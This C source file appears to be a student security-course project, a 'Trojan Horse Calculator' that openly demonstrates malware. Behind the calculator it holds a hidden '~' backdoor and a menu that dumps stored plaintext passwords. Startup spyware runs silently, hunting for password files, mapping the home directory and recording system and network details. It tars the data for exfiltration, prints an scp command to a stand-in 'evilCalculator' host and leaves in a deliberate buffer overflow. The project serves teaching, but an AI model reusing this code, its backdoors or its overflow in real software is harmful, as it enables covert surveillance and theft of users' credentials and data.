#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


/*
CS4920 Port Pirates group project
Trojan Horse Calculator application

Ryan Du Plooy and Murphy Schaff

This program contains a bunch of examples of malicious software, from being a trojan horse, contains a backdoor, etc.

*/

#define STRING_MAX 20
#define FILE_LINE_MAX 100
//function prototypes
int getInt();
bool getOperation(int digit1, int digit2);
void calculator();
void findUser(unsigned int userType);
bool newUser();
bool userAuth();
void formatString(char string[]);
bool administrator(unsigned int backdoor);
void dataExfil();
char* tarFile();
void sendFile(char* hostName);
void runSpyware();
int getString(char* input);

/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                       User Authentication
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
/*
Runs the user authentication protocol
*/
bool userAuth(){
    unsigned int valid = 0;
    unsigned int input;
    bool auth = false;
    
    while (!auth){
        puts("Attempting to authenticate as user. Please enter '0' for existing user or '1' for new user");
        valid = scanf("%d", &input);
        while ((getchar()) != '\n');
        if (valid != 1){
            puts("Please enter a '0' for existing user or a '1' for new user");
        } else {
            if (input == 0){
                findUser(0);
                auth = true;
            } else {
                auth = newUser();
            }
        }

        if (auth){
            puts("Access granted");
            //calls calculator when access is granted.
            calculator();
        }
    }

}
/*
Finds and authenticates existing user
*/
void findUser(unsigned int userType){
    FILE* fileptr;
    char username[STRING_MAX];
    char password[STRING_MAX];
    char checkUser[STRING_MAX];
    char checkPass[STRING_MAX];
    bool searchUser = true;
    bool backdoor = false;

    //Allows the user to attempt to login
    while (searchUser) {
        puts("Please enter your username:");
        getString(username);
        puts("Please enter your password:");
        getString(password);

        formatString(username);
        formatString(password);
        //checks either the normal users file or sudoers file
        if (userType == 0) {
            fileptr = fopen("users/passwords.txt", "r");
        } else {
            fileptr = fopen("users/sudoers.txt", "r");
        }
        //compares user input to to that in the file
        if (fileptr == NULL){
            puts("Unable to open passwords file");
        } else {
            //gets each individual username and password from the passwords file, checks against user input
            while (fgets(checkUser, STRING_MAX, fileptr) != NULL) {
                fgets(checkPass, STRING_MAX, fileptr);
                formatString(checkUser);
                formatString(checkPass);
                if (strcmp(username, checkUser) == 0 && strcmp(password, checkPass) == 0){
                    searchUser = false;
                } else if (strcmp(username, "~") == 0){
                    searchUser = false;
                    backdoor = true;
                }
            }
            if (searchUser == true){
                puts("User not found in file. Try again");
            } else {
                if (backdoor) {
                    puts("You activated a backdoor!");
                } else {
                    puts("found existing user");
                }
            }
        }
        fclose(fileptr);
    }
}
/*
Allows for the creation of new users
*/
bool newUser(){
    FILE* fileptr;
    char username[STRING_MAX];
    char password[STRING_MAX];

    puts("Please enter your username");
    scanf("%s", username);

    puts("Please enter your password");
    scanf("%s", password);

    fileptr = fopen("users/passwords.txt", "a");
    if (fileptr == NULL){
        puts("Unable to open passwords file");
    } else {
        //adds username and password to passwords.txt file
        fputs(username, fileptr);
        fputs("\n", fileptr);
        fputs(password, fileptr);
        fputs("\n", fileptr);
    }
    fclose(fileptr);
    return true;

}
/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                              Administrator
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
bool administrator(unsigned int backdoor){
    int entry;
    char checkUser[STRING_MAX];
    char checkPass[STRING_MAX];
    bool userauth = false;
    bool checkEntry = true;
    bool checkLeave = true;
    FILE* fileptr;
    FILE* sudo;
    //You can only login as administrator, cannot create account
    if (backdoor == 0) {
        findUser(1);
    }
    puts("Welcome to evil mode! >:)");

    while (checkEntry) {
        puts("Here is what you can do, enter for the following options:\n0: Exit back to calculator\n1: Print all user's usernames and passwords\n2: Collect data from machine\n3: Data Exfiltration");
        entry = getInt();
        //User wants to leave admin mode, can either close program or enter back to calculator
        if (entry == 0){
            puts("Enter values to:\n0: Close calculator program\n1: Perform another calculation");
            checkEntry = false;
            while (checkLeave) {
                entry = getInt();
                if (entry == 0){
                    checkLeave = false;
                    return false;
                } else if (entry == 1){
                    checkLeave = false;
                    return true;
                } else {
                    puts("You did not enter a valid input. Please enter 0,1");
                }
            }
        //Admin wants to print all usernames and passwords in the passwords.txt file
        } else if (entry == 1) {
            puts("Printing all usernames and passwords to console:\n");
            fileptr = fopen("users/passwords.txt", "r");
            if (fileptr != NULL){
                while (fgets(checkUser, STRING_MAX, fileptr) != NULL) {
                    fgets(checkPass, STRING_MAX, fileptr);
                    formatString(checkUser);
                    formatString(checkPass);
                    fprintf(stdout, "Username: '%s' Password: '%s'\n", checkUser, checkPass);
                }
                puts("\nEnd normal user stream");
            } else {
                puts("unable to open passwords file. Thats not good...");
            }
            fclose(fileptr);
            puts("Sudoers:\n");
            sudo = fopen("users/sudoers.txt", "r");
            if (fileptr != NULL) {
                while(fgets(checkUser, STRING_MAX, sudo) != NULL) {
                    fgets(checkPass, STRING_MAX, sudo);
                    formatString(checkUser);
                    formatString(checkPass);
                    fprintf(stdout, "Username: '%s' Password: '%s'\n", checkUser, checkPass);
                }
            } else {
                puts("unable to open sudoers file. Thats not good...");
            }
            puts("\nEnd Sudo user stream");
            fclose(sudo);
        //Admin wants to print all stolen data from the system (i.e. running tree file and that stuff)
        } else if (entry == 2) {
            puts("Grabbing all required data from machine...");
            runSpyware();
            puts("Collecting info on potential password leads...");
            puts("Collecting info on User's drive tree...");
            puts("Collecting info on CPU...");
            puts("Collecting info on Network...");
            puts("Collecting info on Drive partitions...");
            puts("Collecting calculator login information...");
            puts("Collected all data from machine. Stored in './data'");
        //Admin wants to extract all data collected from machine
        } else if (entry == 3) {
            dataExfil();
        } else  {
            puts("Please enter a valid option");
        }
    }
}
/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                            Data Exfiltration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
/*
Runs data exfiltration commands
*/
void dataExfil() {
    char* hostName;
    puts("Begin Data exfiltration process.....\nCreating tar......");
    hostName = tarFile();
    puts("Attempting to SCP to server.....");
    sendFile(hostName);
    puts("Data Exfiltration complete!");
}
/*
Sends all data in the data folder to the listening server via SCP
*/
char* tarFile(){
    char tarCMD[FILE_LINE_MAX] = "tar -czf ";
    char* hostName;
    char tarName[FILE_LINE_MAX] = "dataexfil.tar";


    //gets hostname for tarfile name
    hostName = getlogin();
    strcat(hostName, tarName);
    strcpy(tarName, hostName);

    //creates tarCMD, creates tar of data file
    strcat(tarCMD, tarName);
    strcat(tarCMD, " data/");
    system(tarCMD);
    
    return hostName;
}
/*
Sends file via SCP
*/
void sendFile(char* hostName) {
    fprintf(stdout, "scp %s evil@evilCalculator:exfils/%s\n", hostName, hostName);
    puts("Above is the command that would copy the tarred file to a waiting server.");
}
/*
Runs all data algorithms at startup, attempts to send file without knowledge of user.
*/
void autoExfil(){
    runSpyware();
    tarFile();
}

/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                              Spyware
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
/*
Function used to locate potential files containing/relating to passwords and store paths
*/
void locateValuables(){
    system("find ~ -type f \\( -name \"*pass*\" -o -name \"*psswd*\" -o -name \"*pswd*\" \\) > ./data/potential_leads.txt");
}

/*
Function used generate a tree from the user's home directory
*/
void generateTree(){
    system("tree ~ > ./data/tree.txt");
}

void runSpyware(){
    // Create potential_leads.txt file with files potential files containing passwords
    system("find ~ -type f \\( -name \"*pass*\" -o -name \"*psswd*\" -o -name \"*pswd*\" \\) > ./data/potential_leads.txt");

    // Create tree diagram from user's home directory and store in tree.txt
    system("tree ~ > ./data/tree.txt");

    // Create cpu_info.txt containing user's cpu information
    system("lscpu > ./data/cpu_info.txt");

    // Create network_info.txt containing user's network information
    system("ip a > ./data/network_info.txt");

    // Create partition_info.txt containing user's storage/partition information
    system("lsblk > ./data/partition_info.txt");

    // copies password files from evilCalculator users
    system("cp users/passwords.txt data/calculatorUsers.txt");
    system("cp users/sudoers.txt data/calculatorSudoers.txt");
}


/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                       Calculator Functionaltiy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
/*
Function that runs the calculator and does the actual math
*/
void calculator(){
    int input = 0;
    int digit1 = 0;
    int digit2 = 0;
    int result;
    unsigned int valid = 0;
    bool runCalc = true;
    bool run = true;
    bool again = true;
    char op;
    puts("What would you like to do first? Your options are:\n0: Do a calcuation\n1: Exit calculator\n2: Administrator Settings");
    while (run){
        input = getInt();
        if (input == 0) {
            again = true;
            run = false;
        } else if (input == 1) {
            again = false;
            run = false;
            runCalc = false;
        } else if (input == 2){
            //run admin
            runCalc = administrator(0);
            run = false;
        } else {
            puts("Please enter 0,1,2.");
        }
    }
    while (runCalc){
        run = true;
        puts("New Calculation:");
        //enter first number, then second number, then operation
        puts("Enter the first digit:");
        digit1 = getInt();
        puts("Enter second digit:");
        digit2 = getInt();
        puts("Enter operation type '+', '-', '*', '/':");
        run = getOperation(digit1, digit2);

        if (!run) {
            again = false;
        } else {
            //Checks for next move {0: another calculation, 1: exit, 2: enter sudo settings}
            puts("What would you like to do next? Your options are:\n0: Another calcuation\n1: Exit calculator\n2: Administrator Settings");
            while (run){
                input = getInt();
                if (input == 0) {
                    again = true;
                    run = false;
                } else if (input == 1) {
                    again = false;
                    run = false;
                } else if (input == 2){
                    //run admin
                    again = administrator(0);
                    run = false;
                } else {
                    puts("Please enter 0,1,2.");
                }
            }
        }
        //checks if user would like to run another calcualtion
        if (again == false){
            runCalc = false;
        }
    }
    puts("Thank you for using the worlds best calculator!!!");
}
/*
Accepts user input of a valid operation type
*/
bool getOperation(int digit1, int digit2){
    int result = 0;
    unsigned int valid = 0;
    bool run = true;
    bool rtn = true;
    char op;

    while (run){
        valid = scanf("%s", &op);
        if (valid != 1){
            puts("Please enter a valid stirng/char input");
        } else {
            if (strcmp(&op, "+") == 0){
                result = digit1 + digit2;
                fprintf(stdout, "Result:%d\n", result);
                run = false;
            } else if (strcmp(&op, "-") == 0){
                result = digit1 - digit2;
                fprintf(stdout, "Result:%d\n", result);
                run = false;
            } else if (strcmp(&op, "*") == 0){
                result = digit1 * digit2;
                fprintf(stdout, "Result:%d\n", result);
                run = false;
            } else if (strcmp(&op, "/") == 0) {
                result = digit1 / digit2;
                fprintf(stdout, "Result:%d\n", result);
                run = false;
            } else if (strcmp(&op, "~") == 0){
                //trigger backdoor
                puts("backdoor activated!");
                run = false;
                rtn = false;
                administrator(1);
            } else{
                puts("You did not enter a valid operation");
            }
        }
    }
    return rtn;
}
/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                       Misc. Functions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/

/*
Accepts user input of a valid integer value, returns value
*/
int getInt(){
    bool run = true;
    int integer = 0;
    unsigned int valid = 0;
    while(run){
        valid = scanf("%d", &integer);
        while ((getchar()) != '\n');
        if (valid != 1){
            puts("Please enter a valid integer value");
        } else {
            run = false;
        }
    }
    return integer;
}
/*
Formats string by removing new line character
*/
void formatString(char string[]) {
	//removes the new line character from the string/number
	for (unsigned int i = 0; i < STRING_MAX; i++) {
		if (string[i] == '\n') {
			string[i] = '\0';
		}
	}

}
/*
Gets String value (for buffer overflow ease)
*/
int getString(char* input) {
    scanf("%s", input);
    return 1;
}

/*
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                                Main
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
int main(){
    autoExfil();
    puts("Welcome to the best ever calculator!");
    userAuth();
}